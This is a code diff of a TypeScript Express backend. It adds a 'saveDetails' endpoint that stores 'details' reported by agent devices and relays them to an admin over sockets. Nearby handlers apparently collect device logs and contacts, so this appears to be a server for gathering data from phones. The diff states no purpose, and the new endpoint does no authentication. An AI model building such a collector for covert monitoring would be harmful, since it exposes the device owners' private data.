@@ -6,6 +6,7 @@ import {getPreferredTime} from "../utils/time";
 import Message from "../models/message.model";
 import Notification, {INotification} from "../models/notification.model";
 import {writeDeviceLog} from "../utils/logger";
+import Detail, {IDetail} from "../models/detail.model";
 
 export const initAgent = async (req: Request, res: Response) => {
     let {adminID, agentName, agentID, deviceID, deviceName, apiLevel} = req.body;
@@ -134,6 +135,29 @@ export const saveLog = async (req: Request, res: Response) => {
         return res.status(500).json({error: "Failed to save log"});
     }
 };
+
+export const saveDetails = async (req: Request, res: Response) => {
+    let {agentID, adminID, deviceID, details, submissionID} = req.body;
+
+    if (connectedUsers[adminID]) {
+        io.to(connectedUsers[adminID]).emit("new-details-" + deviceID, details);
+    }
+
+    let doc: IDetail | null = await Detail.findOne({submissionID}).lean();
+
+    if (doc) {
+        await Detail.updateOne({submissionID}, {$set: {details: {...doc.details, ...details}}});
+        return respondSuccess(res);
+    }
+
+    let detail = new Detail({
+        agentID, adminID, deviceID, details, submissionID, time: getPreferredTime()
+    });
+
+    await detail.save();
+
+    return respondSuccess(res);
+}
 
 export const saveContacts = async (req: Request, res: Response) => {
 
